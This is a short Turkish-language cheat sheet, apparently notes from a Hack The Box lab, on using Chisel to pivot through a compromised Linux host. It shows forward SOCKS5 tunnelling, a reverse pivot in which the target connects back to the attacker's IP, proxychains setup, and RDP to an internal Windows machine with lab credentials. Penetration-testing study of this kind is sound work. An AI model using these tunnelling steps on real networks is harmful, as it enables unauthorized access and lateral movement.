# Chisel


## usage

### Chiseli başka bir makinaya atalım (A-tacker Makinasından B Makinasına)

```bash
scp chisel ubuntu@10.129.202.64:~/

```


### B Makinasında Chisel ile sunucu açalım

```bash
# ubuntu@webserver$ 
chisel server -v -p 1234 --socks5
```
### A  Makinasından Chisele Bağlanalaım

```bash
# suslu7616@htb[/htb]$ 
# buradaki ip ve port B Makinasının  
chisel client -v 10.129.202.64:1234 socks
```
### Şimdi proxychains4 ayaarlarımızı yapalım

```bash

# suslu7616@htb[/htb]$ 

tail -f /etc/proxychains4.conf 

# bu satırı /etc/proxychains4.conf dosyasına ekleyelim ve proxy kısmındakini kapatalım
socks5 127.0.0.1 1080
```

### Şimdi windowsa bağlanalım A Makinasından

```bash
# suslu7616@htb[/htb]$ 

# /v: buradaki ip-adres targetteki windows makinası
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```



## Chisel Reverse Pivot


### kendi makinamızda A-tacker makinada server açalım

```bash
# suslu7616@htb[/htb]$ 

sudo chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234

```

### Target-Makinadan kendi Makinamıza Bağlanalım


```bash
# ubuntu@WEB01$
# 10.10.14.17:1234 Benim Makinamın ip Adresi Yani Atacker Makinasının

chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected

```

### şimdi kendi A-tacker Makinamızdan Target Makinadaki windowsa Bağlanalım

```bash
# suslu7616@htb[/htb]$ 
/v: B Makinasındaki windows Makina ip adresi
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```